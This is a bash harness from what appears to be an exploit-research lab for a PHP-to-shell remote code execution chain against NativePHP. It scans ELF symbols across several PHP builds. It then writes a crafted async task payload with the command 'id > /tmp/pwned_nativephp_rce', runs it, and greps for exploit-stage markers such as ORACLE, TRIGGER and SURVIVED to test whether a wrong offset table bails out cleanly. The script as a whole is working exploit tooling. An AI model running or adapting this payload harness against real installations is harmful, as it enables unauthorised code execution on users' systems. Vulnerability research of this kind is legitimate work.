#!/bin/bash
# shape9_extra_receipts.sh — broaden the elfsyms receipt + wrong-offset clean-bail proof.
set -u
LAB=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab
REC=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/receipts
PHP=/tmp/php8512_build/plain2/sapi/cli/php

{
echo "=== elfsyms across builds (RELA scan; stripped copy included) ==="
python3 "$LAB/shape9_elfsyms.py" \
  /tmp/php8512_build/plain2/sapi/cli/php \
  /tmp/php_stripped_test \
  /tmp/php8512_build/asan2/sapi/cli/php \
  /tmp/php8512_build/plain/sapi/cli/php \
  /tmp/php8512_build/php-fixed/sapi/cli/php 2>&1
echo
echo "=== wrong-offset-table clean-bail proof (zif off by 1 from a foreign table) ==="
python3 - "$LAB" <<'PYEOF'
import sys
sys.path.insert(0, sys.argv[1])
from shape9_attack import build_payload
open(sys.argv[1] + '/storage/framework/async/payload/shape9-wrongof-00000001.task', 'w') \
    .write(build_payload('ffe461', '523c60', 'id > /tmp/pwned_nativephp_rce'))
PYEOF
timeout 60 env NATIVEPHP_TASK_ID=shape9-wrongof-00000001 "$PHP" -n "$LAB/shape9_runner.php" 2>&1 \
  | grep -E "M1 block2|M2 ORACLE|M2-BAIL|M2-DONE|M3-BAIL|TRIGGER|SURVIVED" || true
rm -f "$LAB/storage/framework/async/payload/shape9-wrongof-00000001.task"
} | tee -a "$REC/nativephp_elfsyms.log"
